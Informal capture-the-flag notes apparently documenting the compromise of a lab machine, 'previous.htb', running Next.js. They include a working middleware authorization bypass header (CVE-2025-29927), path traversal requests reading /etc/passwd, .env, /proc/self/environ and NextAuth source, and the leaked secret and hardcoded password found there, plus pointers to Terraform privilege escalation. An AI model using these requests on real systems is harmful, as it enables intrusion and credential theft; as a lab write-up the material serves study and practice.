___



linux machine

port 80 and 22 ssh the web server is nginx



*jeremy a user?*
jeremy@previous.htb


*this box is running next-js is gonna have shit to do with it*


http%3A%2F%2Flocalhost%3A3000%2Fdocs
http://localhost:3000/docs




*interesting callback redirects to localhost if /api but get prompted to login*


burp see where login post is

dirsearch
check .git



 *I think this gonna b cve*
# Understanding CVE-2025-29927: The Next.js Middleware Authorization Bypass Vulnerability



https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/nextjs-cve-2025-29927



```
curl --request GET \
  --url http://localhost:3000/private \
  --header 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```


this works I bypass auth


*okay time to start reading those files under _next -> some interesting shit*



let r=new URL("http://localhost:3000/api/auth");


var t="/api/auth/signin?"



*sorted pages*

__routerFilterDynamic:{numItems:s,errorRate:1e-4,numBits:s,numHashes:n,bitArray:[]},"/":["static/chunks/pages/index-a09f42904785092c.js"],"/_error":["static/chunks/pages/_error-41608b100cc61246.js"],"/docs":[e,t,"static/chunks/pages/docs-5f6acb8b3a59fb7f.js"],"/docs/components/layout":[e,t,"static/chunks/pages/docs/components/layout-79ce7edc85dbc179.js"],"/docs/components/sidebar":[e,"static/chunks/pages/docs/components/sidebar-0302befb549e0142.js"],"/docs/content/examples":["static/chunks/pages/docs/content/examples-e4a3a28759c69901.js"],"/docs/content/getting-started":["static/chunks/pages/docs/content/getting-started-7dd61d428f6ada5c.js"],"/docs/[section]":[e,t,"static/chunks/pages/docs/[section]-31d8b831c1e60f26.js"],"/signin":[t,"static/chunks/pages/signin-d0284ed11872b445.js"],sortedPages:["/","/_app","/_error","/docs","/docs/components/layout","/docs/components/sidebar","/docs/content/examples","/docs/content/getting-started","/docs/[section]","/signin"]}}(0,"static/chunks/8-fd0c493a642e766e.js","static/chunks/0-c54fcec2d27b858d.js",1e-4,NaN),self.__BUILD_MANIFEST_CB&&self.__BUILD_MANIFEST_CB();




,sortedPages:["/","/_app","/_error",

"/docs","/docs/components/layout",
"/docs/components/sidebar","/docs/content/examples",

"/docs/content/getting-started",

"/docs/[section]","/signin"]

/index




*idk if this something*
"./examples.mdx":[2183,183],"./getting-started.mdx":[1894,894]





*idk if i can access any of these*

i="/_not-found",l=""+i+"/page",u="phase-export",s="phase-production-build",c="phase-production-server",f="phase-development-server",d="phase-test",p="phase-info",h="pages-manifest.json",_="webpack-stats.json",m="app-paths-manifest.json",g="app-path-routes-manifest.json",b="build-manifest.json",E="app-build-manifest.json",y="functions-config-manifest.json",P="subresource-integrity-manifest",v="next-font-manifest",R="export-marker.json",O="export-detail.json",S="prerender-manifest.json",j="routes-manifest.json",T="images-manifest.json",A="required-server-files.json",C="_devPagesManifest.json",w="middleware-manifest.json",I="_clientMiddlewareManifest.json",N="_devMiddlewareManifest.json",x="react-loadable-manifest.json",M="server",L=["next.config.js","next.config.mjs","next.config.ts"],D="BUILD_ID",U=["/_document","/_app","/_error"],k="public",F="static",B="__NEXT_DROP_CLIENT_FILE__",H="__NEXT_BUILTIN_DOCUMENT__",X="__barrel_optimize__",W="client-reference-manifest",G="server-reference-manifest",q="middleware-build-manifest",V="middleware-react-loadable-manifest",z="interception-route-rewrite-manifest",Y="dynamic-css-manifest",K="main",$=""+K+"-app",Q="app-pages-internals",J="react-refresh",Z="amp",ee="webpack",et="polyfills",er=Symbol(et),en="webpack-runtime",eo="edge-runtime-webpack",ea="__N_SSG",ei="__N_SSP",el={name:"Times New Roman",xAvgCharWidth:821,azAvgWidth:854.3953488372093,unitsPerEm:2048





},r.e=e=>Promise.all(Object.keys(r.f).reduce((t,o)=>(r.f[o](e,t),t),[])),r.u=e=>"static/chunks/"+e+"."+({183:"6bdbefdb497911d7",894:"73dc0969341e015c"})[e]+".js",


 
 
 href="/api/download?example=hello-world.ts"

>Download the full example <a href="/api/download?example=hello-world.ts">here</a>





*found directory traversal  here*

GET /api/download?example=../../../../../etc/passwd HTTP/1.1
Host: previous.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://previous.htb/api
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
x-nextjs-data: 1
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: next-auth.csrf-token=878abd82aa816783ed93daba74d2fa880db0e9ba2488b925a378f5c8d62e9701%7C80a017003b6a29c1f63a308f3d91af744bc262786b78d02d598d2b2f2a06edd8; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs%2Fgetting-started
Priority: u=4



*no keys to read*

can I read database or hardcoded credentials/ env file? but i need to figure out project tree


its being hosted with nginx so www dir in var

see a next.js project structure


/var/www/html/next.config.js

*try to read this file to find the root*


I think it could be on /home/nextjs or /home/node as well but then wtf is the project name?


*can I read the nginx conf file?*


its 3 directories deep



*this worked*
GET /api/download?example=../../.env

NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a



*package.json*

{
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build"
  },
  "dependencies": {
    "@mdx-js/loader": "^3.1.0",
    "@mdx-js/react": "^3.1.0",
    "@next/mdx": "^15.3.0",
    "@tailwindcss/postcss": "^4.1.3",
    "@tailwindcss/typography": "^0.5.16",
    "@types/mdx": "^2.0.13",
    "next": "^15.2.2",
    "next-auth": "^4.24.11",
    "postcss": "^8.5.3",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "tailwindcss": "^4.1.3"
  },
  "devDependencies": {
    "@types/node": "22.14.0",
    "@types/react": "19.1.0",
    "typescript": "5.8.3"
  }
}



There is a folder on the root of the filesystem called /app

inside that folder theres the app




*either i find something inside /app that gives me creds*


-> the way to go seems to be to enumerate the files more and find something worthwhile to read
-> or try to look better at the docs for next.js directory structure or if there is some sensiteive file I can read


there r 2 users

nextjs && node -> node has bash shell so I think thats user



*found this so all those build files might b around here*

GET /api/download?example=../../../../../app/.next/build-manifest.json



filename=../../../../../app/.next/build-manifest.json
ETag: "9i91vm5qeq8cq"

{
  "polyfillFiles": [
    "static/chunks/polyfills-42372ed130431b0a.js"
  ],
  "devFiles": [],
  "ampDevFiles": [],
  "lowPriorityFiles": [
    "static/qVDR2cKpRgqCslEh-llk9/_buildManifest.js",
    "static/qVDR2cKpRgqCslEh-llk9/_ssgManifest.js"
  ],
  "rootMainFiles": [],
  "rootMainFilesTree": {},
  "pages": {
    "/": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/pages/index-a09f42904785092c.js"
    ],
    "/_app": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/css/9a1ff1f4870b5a50.css",
      "static/chunks/pages/_app-95f33af851b6322a.js"
    ],
    "/_error": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/pages/_error-41608b100cc61246.js"
    ],
    "/docs": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/8-fd0c493a642e766e.js",
      "static/chunks/0-c54fcec2d27b858d.js",
      "static/chunks/pages/docs-5f6acb8b3a59fb7f.js"
    ],
    "/docs/[section]": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/8-fd0c493a642e766e.js",
      "static/chunks/0-c54fcec2d27b858d.js",
      "static/chunks/pages/docs/[section]-31d8b831c1e60f26.js"
    ],
    "/docs/components/layout": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/8-fd0c493a642e766e.js",
      "static/chunks/0-c54fcec2d27b858d.js",
      "static/chunks/pages/docs/components/layout-79ce7edc85dbc179.js"
    ],
    "/docs/components/sidebar": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/8-fd0c493a642e766e.js",
      "static/chunks/pages/docs/components/sidebar-0302befb549e0142.js"
    ],
    "/docs/content/examples": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/pages/docs/content/examples-e4a3a28759c69901.js"
    ],
    "/docs/content/getting-started": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/pages/docs/content/getting-started-7dd61d428f6ada5c.js"
    ],
    "/signin": [
      "static/chunks/webpack-cb370083d4f9953f.js",
      "static/chunks/framework-ee17a4c43a44d3e2.js",
      "static/chunks/main-0221d9991a31a63c.js",
      "static/chunks/0-c54fcec2d27b858d.js",
      "static/chunks/pages/signin-d0284ed11872b445.js"
    ]
  },
  "ampFirstPages": []
}



I have and can access all the 



/proc/self/environ


*whoami*
NODE_VERSION=18.20.8 HOSTNAME=0.0.0.0 YARN_VERSION=1.22.22 SHLVL=1 PORT=3000 HOME=/home/nextjs PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NEXT_TELEMETRY_DISABLED=1 PWD=/app NODE_ENV=production 





*check all pages*
sortedPages:["/","/_app","/_error","/docs","/docs/components/layout","/docs/components/sidebar","/docs/content/examples","/docs/content/getting-started","/docs/[section]","/signin"]}}(

x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware



/docs is a fucking slug

/docs/[section]



*ok so im using a slug to match docs -> also __app means im using  the pages routers*


app/pages/docs/[section].js


*is should b this why tf not*
/app/pages/docs/[section].mdx 




*there is a package to handle mdx files*
/app/content/docs/examples.mdx




# omfg i found som

GET /api/download?example=../../../../../app/pages/_app.js





*apparently this is where my content is supposed to be*

./app/pages/docs/content/api-reference.md



*pretty sure im supposed to read file here probs md or mdx but what path*






*ok so like def mdx*
 },
    9853: (e, t, r) => {
      var l = {
        './examples.mdx': [
          2183,
          183
        ],
        './getting-started.mdx': [
          1894,
          894
        ]
      };




# more info

GET /api/download?example=../../../../../app/.next/server/pages-manifest.json HT



{
  "/_app": "pages/_app.js",
  "/_error": "pages/_error.js",
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
  "/api/download": "pages/api/download.js",
  "/docs/[section]": "pages/docs/[section].html",
  "/docs/components/layout": "pages/docs/components/layout.html",
  "/docs/components/sidebar": "pages/docs/components/sidebar.html",
  "/docs/content/examples": "pages/docs/content/examples.html",
  "/docs/content/getting-started": "pages/docs/content/getting-started.html",
  "/docs": "pages/docs.html",
  "/": "pages/index.html",
  "/signin": "pages/signin.html",
  "/_document": "pages/_document.js",
  "/404": "pages/404.html"
}




*more info*

../../../../../app/.next/routes-manifest.json



*this is the path that I have LFI*
http://previous.htb/api/download?example=hello-world.ts




LFI is running as nextjs user I need to get the nodejs user


if I could read NextAuth.js maybe that would help

Welcome to Alpine Linux 3.21
Kernel \r on an \m (\l)



*this doesnt appear to be vuln to RFI*



is poisoning the environment the way to go??? with /proc/self/environ?cmd=whoami?

at least with the user agent this did not work





*this is the path holly fucking shit this was a fkn trip*
GET /api/download?example=../../../../../../../../../app/.next/server/pages/api/auth/[...nextauth].js


hardcoded credentials here



var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();




*username and pass*
e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?


jeremy
@
MyNameIsJeremyAndILovePancakes



-> user is jeremy with that pass on the machine nextjs was on a container 


sudo -l



POC for priv esc

https://medium.com/@toshithh/proof-of-concept-terraform-privilege-escalation-cd3db69df90e




*really cool article in priv esc with terraform if you can edit the state file*

https://www.plerion.com/blog/hacking-terraform-state-for-privilege-escalation



*read the root key got root 



